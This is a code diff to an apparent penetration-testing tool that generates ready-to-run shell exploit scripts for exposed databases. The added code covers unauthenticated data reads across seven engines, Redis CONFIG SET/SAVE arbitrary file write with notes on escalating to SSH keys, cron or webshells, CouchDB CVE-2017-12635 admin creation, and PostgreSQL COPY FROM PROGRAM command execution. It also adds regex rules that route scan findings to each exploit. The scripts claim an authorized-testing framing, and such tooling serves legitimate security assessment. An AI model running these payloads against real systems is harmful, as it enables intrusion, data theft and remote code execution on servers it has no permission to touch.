@@ -100,6 +100,94 @@ def _c_win_exe() -> str:
         "}\n")
 
 
+# Every PoC carries this marker: it PROVES the finding, and shows exactly where the
+# operator substitutes their authorized action.
+_ROE = ("# >>> ROE: this PoC PROVES the finding (unambiguous, then reverts). "
+        "Set your authorized ACTION where marked. <<<")
+
+
+def _sh_db_read() -> str:
+    return (
+        "#!/bin/sh\n"
+        "# recce unauthenticated-DB read PoC - PROVES anonymous data access, read-only.\n"
+        "# Usage: sh recce_poc_db_read.sh <ip> <port> <engine>\n"
+        "#   engine in: memcached couchdb influxdb cassandra redis elasticsearch mongodb\n"
+        "ip=\"$1\"; port=\"$2\"; eng=\"$3\"\n"
+        "case \"$eng\" in\n"
+        "  memcached) printf 'stats\\r\\nstats items\\r\\n' | ncat \"$ip\" \"$port\" ;;\n"
+        "  couchdb)   curl -s \"http://$ip:$port/_all_dbs\"; echo;"
+        " curl -s \"http://$ip:$port/_node/_local/_config\" | head -c 400 ;;\n"
+        "  influxdb)  curl -s -G \"http://$ip:$port/query\""
+        " --data-urlencode 'q=SHOW DATABASES' ;;\n"
+        "  cassandra) cqlsh \"$ip\" \"$port\" -e 'DESCRIBE KEYSPACES' ;;\n"
+        "  redis)     redis-cli -h \"$ip\" -p \"$port\" INFO server ;;\n"
+        "  elasticsearch) curl -s \"http://$ip:$port/_cat/indices?v\" ;;\n"
+        "  mongodb)   mongosh --host \"$ip\" --port \"$port\" --quiet"
+        " --eval 'db.adminCommand({listDatabases:1})' ;;\n"
+        "  *) echo \"unknown engine: $eng\"; exit 2 ;;\n"
+        "esac\n"
+        "# PROOF: any database/keyspace/index/stats returned = anonymous read confirmed.\n")
+
+
+def _sh_redis_rce() -> str:
+    return (
+        "#!/bin/sh\n"
+        "# recce Redis unauth -> file-write RCE PoC. PROVES the write primitive by\n"
+        "# planting a benign marker file; swap the payload for your authorized ACTION.\n"
+        "# Usage: sh recce_poc_redis_rce.sh <ip> <port>\n"
+        "ip=\"$1\"; port=\"${2:-6379}\"\n"
+        "r() { redis-cli -h \"$ip\" -p \"$port\" \"$@\"; }\n"
+        "echo '[*] confirming unauth + reading the write-primitive config'\n"
+        "r INFO server | grep -i redis_version\n"
+        "r CONFIG GET dir; r CONFIG GET dbfilename\n"
+        "echo '[*] PoC: write a marker to /tmp (benign - proves arbitrary file write)'\n"
+        "r CONFIG SET dir /tmp\n"
+        "r CONFIG SET dbfilename recce_poc.txt\n"
+        "r SET recce_poc 'recce write-primitive proof'\n"
+        "r SAVE\n"
+        "# " + _ROE + "\n"
+        "# ROE escalation (only in scope): set dir to ~/.ssh + dbfilename authorized_keys\n"
+        "# and SET an SSH public key; or the crontab / webshell path variants -> RCE.\n"
+        "# PROOF: /tmp/recce_poc.txt exists on the target and contains the marker.\n")
+
+
+def _sh_couchdb_rce() -> str:
+    return (
+        "#!/bin/sh\n"
+        "# recce CouchDB admin-party / CVE-2017-12635 -> admin -> query-server RCE PoC.\n"
+        "# Usage: sh recce_poc_couchdb.sh <ip> <port>\n"
+        "ip=\"$1\"; port=\"${2:-5984}\"; b=\"http://$ip:$port\"\n"
+        "echo '[*] confirm admin party (admin-only config readable with no auth)'\n"
+        "curl -s \"$b/_node/_local/_config/admins\"; echo\n"
+        "echo '[*] PoC: create a throwaway admin (admin party) - REMOVE afterwards'\n"
+        "curl -s -X PUT \"$b/_node/_local/_config/admins/recce_poc\" -d '\"Recce!Poc123\"'; echo\n"
+        "curl -s -u recce_poc:'Recce!Poc123' \"$b/_all_dbs\"; echo\n"
+        "# " + _ROE + "\n"
+        "# ROE escalation (in scope): register a config query_server / os_daemon (2.x) or\n"
+        "# the CVE-2017-12636 chain to run a command as the couchdb user -> RCE.\n"
+        "# CLEANUP: curl -X DELETE -u recce_poc:'Recce!Poc123' "
+        "\"$b/_node/_local/_config/admins/recce_poc\"\n"
+        "# PROOF: the throwaway admin authenticates to /_all_dbs.\n")
+
+
+def _sh_pg_rce() -> str:
+    return (
+        "#!/bin/sh\n"
+        "# recce PostgreSQL COPY...FROM PROGRAM -> OS command exec PoC (needs superuser,\n"
+        "# e.g. via trust auth or weak creds). PROVES command execution, benign marker.\n"
+        "# Usage: sh recce_poc_pg_rce.sh <ip> <port> [user] [db]\n"
+        "ip=\"$1\"; port=\"${2:-5432}\"; u=\"${3:-postgres}\"; db=\"${4:-postgres}\"\n"
+        "psql \"host=$ip port=$port user=$u dbname=$db\" <<'SQL'\n"
+        "DROP TABLE IF EXISTS recce_poc;\n"
+        "CREATE TABLE recce_poc(out text);\n"
+        "COPY recce_poc FROM PROGRAM 'id; uname -a';\n"
+        "SELECT * FROM recce_poc;\n"
+        "DROP TABLE recce_poc;\n"
+        "SQL\n"
+        "# " + _ROE + "\n"
+        "# PROOF: the table holds the output of `id` / `uname -a` from the DB host.\n")
+
+
 # --- recipe registry ------------------------------------------------------------
 # files : {filename: source}   build : [shell build commands]
 # deliver: how to place/trigger it   proof: how to confirm it fired
@@ -169,6 +257,42 @@ RECIPES: dict[str, dict] = {
         "proof": "net localgroup administrators  -> lists recce_poc.  REMOVE it afterwards "
                  "(net localgroup administrators recce_poc /del).",
     },
+    "db_unauth_read": {
+        "name": "Unauthenticated database -> anonymous data read (proof)",
+        "files": {"recce_poc_db_read.sh": _sh_db_read()},
+        "build": ["chmod +x recce_poc_db_read.sh"],
+        "deliver": "sh recce_poc_db_read.sh <ip> <port> <engine>   "
+                   "(memcached|couchdb|influxdb|cassandra|redis|elasticsearch|mongodb)",
+        "proof": "the databases / keyspaces / indices / cached keys returned with no "
+                 "credential = confirmed anonymous read exposure.",
+    },
+    "redis_rce": {
+        "name": "Redis unauth CONFIG+SAVE -> arbitrary file write / RCE",
+        "files": {"recce_poc_redis_rce.sh": _sh_redis_rce()},
+        "build": ["chmod +x recce_poc_redis_rce.sh"],
+        "deliver": "sh recce_poc_redis_rce.sh <ip> <port>   "
+                   "(plants a benign /tmp marker; escalate to ~/.ssh/cron/webshell in ROE)",
+        "proof": "cat /tmp/recce_poc.txt on the target -> the marker = arbitrary file "
+                 "write confirmed (one step from RCE).",
+    },
+    "couchdb_rce": {
+        "name": "CouchDB admin-party / CVE-2017-12635 -> admin -> query-server RCE",
+        "files": {"recce_poc_couchdb.sh": _sh_couchdb_rce()},
+        "build": ["chmod +x recce_poc_couchdb.sh"],
+        "deliver": "sh recce_poc_couchdb.sh <ip> <port>   "
+                   "(creates a throwaway admin; register a query_server for RCE in ROE)",
+        "proof": "the throwaway admin authenticates to /_all_dbs -> full admin control "
+                 "(then query-server = RCE). REMOVE the admin afterwards.",
+    },
+    "postgres_rce": {
+        "name": "PostgreSQL COPY ... FROM PROGRAM -> OS command execution",
+        "files": {"recce_poc_pg_rce.sh": _sh_pg_rce()},
+        "build": ["chmod +x recce_poc_pg_rce.sh"],
+        "deliver": "sh recce_poc_pg_rce.sh <ip> <port> [user] [db]   "
+                   "(needs a superuser login, e.g. via trust auth or weak creds)",
+        "proof": "the result table holds the output of `id`/`uname -a` from the DB "
+                 "host -> OS command execution confirmed.",
+    },
 }
 
 
@@ -184,6 +308,18 @@ _MATCH = [
      r"web\.config readable|crossdomain|prometheus /metrics|\.htpasswd|graphql introspection|"
      r"cors reflects|server-side template injection|jwt (accepts|uses)|secret in client-side js|"
      r"backup/source file", "web"),
+    # Databases: the RCE-capable weaknesses first (a redis/couchdb/postgres finding
+    # gets its dedicated escalation harness), then the generic anonymous-read proof for
+    # every other exposed engine.
+    (r"redis exposed without auth|config[ -]?set dir|write primitive available|"
+     r"redis.*(file[ -]?write|-> ?rce)", "redis_rce"),
+    (r"admin party|couchdb.*(admin|privileg|12635|12636|query[ -]?server)", "couchdb_rce"),
+    (r"trust authentication|copy \.\.\. from program|copy .*from program|"
+     r"from program.*(rce|command)", "postgres_rce"),
+    (r"exposed without authentication|unauthenticated (database|query|data|index)|"
+     r"no authentication \(allowall\)|allowallauthenticator|empty[ -]password login|"
+     r"unauth.*(indices|data|read)|memcached exposed|cassandra exposed|"
+     r"influxdb exposed|elasticsearch exposed|mongodb exposed", "db_unauth_read"),
     (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
      r"writable service registry", "win_service_exe"),
     (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
@@ -213,12 +349,6 @@ def _url_from_vuln(v) -> str:
     sch = "https" if port in _TLS_PORTS else "http"
     hostport = v.ip if port in (80, 443) else f"{v.ip}:{port}"
     return f"{sch}://{hostport}"
-
-
-# Every PoC carries this marker: it PROVES the finding, and shows exactly where the
-# operator substitutes their authorized action.
-_ROE = ("# >>> ROE: this PoC PROVES the finding (unambiguous, then reverts). "
-        "Set your authorized ACTION where marked. <<<")
 
 
 def _p_git(u):
